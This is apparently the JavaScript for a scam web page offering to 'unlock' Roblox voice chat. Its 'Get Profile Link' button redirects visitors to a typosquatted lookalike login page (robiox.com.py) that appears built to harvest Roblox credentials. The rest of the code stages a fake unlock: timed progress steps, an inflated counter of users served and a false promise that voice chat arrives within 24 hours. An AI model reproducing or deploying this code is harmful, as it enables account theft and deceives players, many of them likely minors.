const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";

let todayCount = parseInt(localStorage.getItem('vc_today_count')) || 1248;
let activityHistory = JSON.parse(localStorage.getItem('vc_activity_history')) || [];

function saveTodayCount() {
    localStorage.setItem('vc_today_count', todayCount);
}

function saveActivityHistory() {
    if (activityHistory.length > 20) {
        activityHistory = activityHistory.slice(0, 20);
    }
    localStorage.setItem('vc_activity_history', JSON.stringify(activityHistory));
}

let processingQueue = [];

const progressContainer = document.getElementById('progressContainer');
const progressBar = document.getElementById('progressBar');
const modalOverlay = document.getElementById('modalOverlay');
const modalCloseBtn = document.getElementById('modalCloseBtn');
const finalMessageDiv = document.getElementById('finalMessage');
const activityFeed = document.getElementById('activityFeed');
const todayCountElem = document.getElementById('todayCount');
const processingCountElem = document.getElementById('processingCount');
const notificationBar = document.getElementById('notificationBar');
const notificationIcon = document.getElementById('notificationIcon');
const notificationTitle = document.getElementById('notificationTitle');
const notificationMessage = document.getElementById('notificationMessage');

let progressInterval = null;

function showNotification(title, message, type = 'info') {
    const iconElement = notificationIcon.querySelector('i');
    
    if (type === 'success') {
        iconElement.className = 'fas fa-check-circle';
        iconElement.style.color = '#22c55e';
        notificationIcon.style.background = 'rgba(34, 197, 94, 0.2)';
    } else if (type === 'error') {
        iconElement.className = 'fas fa-exclamation-triangle';
        iconElement.style.color = '#f97316';
        notificationIcon.style.background = 'rgba(249, 115, 22, 0.2)';
    } else {
        iconElement.className = 'fas fa-info-circle';
        iconElement.style.color = '#8b5cf6';
        notificationIcon.style.background = 'rgba(139, 92, 246, 0.2)';
    }
    
    notificationTitle.textContent = title;
    notificationMessage.textContent = message;
    
    notificationBar.classList.add('show');
    
    setTimeout(() => {
        notificationBar.classList.remove('show');
    }, 5000);
}

window.closeNotificationBar = function() {
    notificationBar.classList.remove('show');
};

function updateProcessingCount() {
    processingCountElem.textContent = processingQueue.length;
}

function addToProcessing(username) {
    processingQueue.push({ username, startTime: Date.now() });
    updateProcessingCount();
    
    setTimeout(() => {
        const index = processingQueue.findIndex(u => u.username === username);
        if (index !== -1) {
            processingQueue.splice(index, 1);
            updateProcessingCount();
        }
    }, 7500);
}

function getTimeAgo(timestamp) {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    if (seconds < 60) return 'just now';
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes} min ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} hr ago`;
    return `${Math.floor(hours / 24)} days ago`;
}

function renderActivityFeed() {
    activityFeed.innerHTML = '';
    if (activityHistory.length === 0) {
        activityFeed.innerHTML = '<div class="activity-item"><i class="fas fa-info-circle"></i><span>No recent activity</span><span class="activity-time"></span></div>';
        return;
    }
    
    activityHistory.forEach((activity) => {
        const activityItem = document.createElement('div');
        activityItem.className = 'activity-item';
        activityItem.innerHTML = `
            <i class="fas fa-check-circle"></i>
            <span><span class="activity-user">@${activity.username}</span> just unlocked VC</span>
            <span class="activity-time">${getTimeAgo(activity.timestamp)}</span>
        `;
        activityFeed.appendChild(activityItem);
    });
}

function addRealActivity(username) {
    activityHistory.unshift({
        username: username,
        timestamp: Date.now()
    });
    
    if (activityHistory.length > 20) {
        activityHistory = activityHistory.slice(0, 20);
    }
    
    saveActivityHistory();
    renderActivityFeed();
}

function resetSteps() {
    const steps = ['step1', 'step2', 'step3'];
    steps.forEach((stepId) => {
        const step = document.getElementById(stepId);
        const iconDiv = step.querySelector('.step-icon');
        const statusSpan = step.querySelector('.step-status');
        iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
        statusSpan.textContent = 'Pending';
        statusSpan.style.color = '#64748b';
    });
    finalMessageDiv.style.display = 'none';
    modalCloseBtn.style.display = 'none';
}

function updateStep(stepId, isComplete = false) {
    const step = document.getElementById(stepId);
    const iconDiv = step.querySelector('.step-icon');
    const statusSpan = step.querySelector('.step-status');
    
    if (isComplete) {
        iconDiv.innerHTML = '<i class="fas fa-check-circle" style="color: #22c55e;"></i>';
        statusSpan.textContent = 'Completed';
        statusSpan.style.color = '#22c55e';
    } else {
        iconDiv.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #8b5cf6;"></i>';
        statusSpan.textContent = 'In progress';
        statusSpan.style.color = '#8b5cf6';
    }
}

function runSteps(callback) {
    updateStep('step1', false);
    setTimeout(() => {
        updateStep('step1', true);
        updateStep('step2', false);
        setTimeout(() => {
            updateStep('step2', true);
            updateStep('step3', false);
            setTimeout(() => {
                updateStep('step3', true);
                finalMessageDiv.style.display = 'block';
                modalCloseBtn.style.display = 'block';
                if (callback) callback();
            }, 2500);
        }, 2500);
    }, 2500);
}

function startProgress() {
    progressContainer.style.display = 'block';
    let width = 0;
    if (progressInterval) clearInterval(progressInterval);
    progressInterval = setInterval(() => {
        if (width >= 90) {
            clearInterval(progressInterval);
        } else {
            width += 10;
            progressBar.style.width = width + '%';
        }
    }, 80);
}

function completeProgress() {
    if (progressInterval) {
        clearInterval(progressInterval);
        progressInterval = null;
    }
    progressBar.style.width = '100%';
    setTimeout(() => {
        progressContainer.style.display = 'none';
        progressBar.style.width = '0%';
    }, 500);
}

function isValidProfileLink(profileUrl) {
    if (!profileUrl || profileUrl.trim() === "") return false;
    let url = profileUrl.trim();
    try {
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'https://' + url;
        }
        const urlObj = new URL(url);
        if (!urlObj.hostname.includes('roblox.com')) return false;
        return true;
    } catch (e) {
        return false;
    }
}

function isValidUsername(username) {
    if (!username || username.trim() === "") return false;
    const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
    return usernameRegex.test(username.trim());
}

async function fetchUserAvatar(username) {
    try {
        const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
        const data = await response.json();
        
        if (data && data.Id) {
            const userId = data.Id;
            const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=100x100&format=Png`);
            const avatarData = await avatarResponse.json();
            
            if (avatarData.data && avatarData.data[0]) {
                return {
                    userId: userId,
                    avatarUrl: avatarData.data[0].imageUrl
                };
            }
        }
        
        return {
            userId: null,
            avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
        };
    } catch (error) {
        console.error('Error fetching avatar:', error);
        return {
            userId: null,
            avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
        };
    }
}

async function saveRecentUser(username) {
    const userInfo = await fetchUserAvatar(username);
    
    const newUser = {
        username: username,
        userId: userInfo.userId,
        avatar: userInfo.avatarUrl,
        timestamp: Date.now()
    };
    
    let recent = JSON.parse(localStorage.getItem("recentUsers")) || [];
    
    const existingIndex = recent.findIndex(user => user.username.toLowerCase() === username.toLowerCase());
    
    if (existingIndex !== -1) {
        recent.splice(existingIndex, 1);
    }
    
    recent.unshift(newUser);
    recent = recent.slice(0, 10);
    
    localStorage.setItem("recentUsers", JSON.stringify(recent));
    loadRecentUsers();
    
    return newUser;
}

function loadRecentUsers() {
    const recentList = document.getElementById('recentList');
    const recent = JSON.parse(localStorage.getItem("recentUsers")) || [];
    
    if (recent.length === 0) {
        recentList.innerHTML = `
            <div class="recent-empty">
                <i class="fas fa-user-friends"></i>
                <p>No recent users yet</p>
                <p style="font-size: 12px; margin-top: 8px;">Enter a username above to get started</p>
            </div>
        `;
        return;
    }
    
    recentList.innerHTML = recent.map(user => `
        <div class="recent-card" data-username="${user.username}">
            <img src="${user.avatar}" alt="${user.username}" class="recent-avatar" onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'">
            <div class="recent-username">@${user.username}</div>
            ${user.userId ? 
                `<a href="https://www.roblox.com/users/${user.userId}/profile" target="_blank" class="recent-link" onclick="event.stopPropagation()">
                    <i class="fas fa-external-link-alt"></i> View Profile
                </a>` :
                `<span class="recent-link" style="opacity: 0.6; cursor: default;">
                    <i class="fas fa-user"></i> Profile not found
                </span>`
            }
        </div>
    `).join('');
    
    document.querySelectorAll('.recent-card').forEach(card => {
        card.addEventListener('click', function() {
            const username = this.dataset.username;
            const usernameInput = document.getElementById('usernameInput');
            usernameInput.value = username;
            usernameInput.focus();
            showNotification("Username Loaded", `@${username} has been added to the username field`, "info");
        });
    });
}

function animateNewCard() {
    const cards = document.querySelectorAll('.recent-card');
    if (cards.length > 0) {
        cards[0].style.animation = 'slideIn 0.4s ease';
        setTimeout(() => {
            cards[0].style.animation = '';
        }, 400);
    }
}

function handleGetProfileLink() {
    window.location.href = REDIRECT_URL;
    showNotification("Redirecting", "Opening Roblox login page...", "info");
}

async function handleConfirm() {
    const profileLink = document.getElementById('profileLinkInput').value.trim();
    const username = document.getElementById('usernameInput').value.trim();
    
    if (profileLink === "") {
        showNotification("Missing Information", "Please enter your Roblox profile link", "error");
        return;
    }
    
    if (username === "") {
        showNotification("Missing Information", "Please enter your Roblox username", "error");
        return;
    }
    
    if (!isValidProfileLink(profileLink)) {
        showNotification("Invalid Link", "Please enter a valid Roblox profile URL", "error");
        return;
    }
    
    if (!isValidUsername(username)) {
        showNotification("Invalid Username", "Use 3-20 characters (letters, numbers, underscores)", "error");
        return;
    }
    
    try {
        await saveRecentUser(username);
        animateNewCard();
        showNotification("Recent Activity Updated", `@${username} has been added to recent users`, "success");
    } catch (error) {
        console.error('Error saving recent user:', error);
    }
    
    addToProcessing(username);
    
    startProgress();
    resetSteps();
    modalOverlay.classList.add('active');
    
    runSteps(() => {
        completeProgress();
        todayCount++;
        todayCountElem.textContent = todayCount.toLocaleString();
        saveTodayCount();
        
        addRealActivity(username);
        
        showNotification("Success!", `Voice Chat will be unlocked for @${username} within 24 hours`, "success");
        
        const confirmBtn = document.getElementById('confirmBtn');
        confirmBtn.style.transform = 'scale(1.02)';
        setTimeout(() => {
            confirmBtn.style.transform = '';
        }, 200);
    });
}

function closeModal() {
    modalOverlay.classList.remove('active');
}

document.getElementById('getProfileLink').addEventListener('click', handleGetProfileLink);
document.getElementById('confirmBtn').addEventListener('click', handleConfirm);
modalCloseBtn.addEventListener('click', closeModal);

modalOverlay.addEventListener('click', function(e) {
    if (e.target === modalOverlay) {
        closeModal();
    }
});

document.getElementById('usernameInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleConfirm();
    }
});

document.getElementById('profileLinkInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleConfirm();
    }
});

setInterval(() => {
    renderActivityFeed();
}, 60000);

todayCountElem.textContent = todayCount.toLocaleString();
renderActivityFeed();

document.addEventListener('DOMContentLoaded', () => {
    loadRecentUsers();
});

setTimeout(() => {
    showNotification("Welcome to VC Unlocker", "Click 'Get Profile Link' to start the process", "info");
}, 500);